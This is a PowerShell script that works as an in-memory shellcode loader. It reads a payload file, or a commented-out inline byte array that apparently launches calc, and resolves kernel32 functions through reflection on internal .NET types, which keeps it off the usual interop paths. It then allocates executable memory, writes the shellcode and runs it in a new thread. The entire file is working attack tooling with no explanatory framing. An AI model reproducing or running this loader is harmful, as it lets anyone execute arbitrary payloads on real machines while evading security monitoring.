#[Byte[]] $SHELLCODE = 0x53,0x56,0x57,0x55,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5d,0x5f,0x5e,0x5b,0xc3
[byte[]]$SHELLCODE = [System.IO.File]::ReadAllBytes("$(pwd)\payload.bin")

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

# Obtain the required types via reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
#$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# Obtain the function addresses of the required hollowing functions
$VirtualAllocAddr = Get-Function "kernel32.dll" "VirtualAlloc"
$WriteProcessMemoryAddr = Get-Function "kernel32.dll" "WriteProcessMemory"
$CreateThreadAddr = Get-Function "kernel32.dll" "CreateThread"
$WaitForSingleObjectAddr = Get-Function "kernel32.dll" "WaitForSingleObject"

# Create the delegate types to call the previously obtain function addresses
$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])
$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$WaitForSingleObjectAddr = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])

# Magic OwO
$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, $SHELLCODE.Length, 0x3000, 0x40)
$WriteProcessMemory.Invoke(-1, $lpMem, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)
$hThread = $CreateThread.Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
$WaitForSingleObjectAddr.Invoke($hThread, 0xFFFFFFFF)
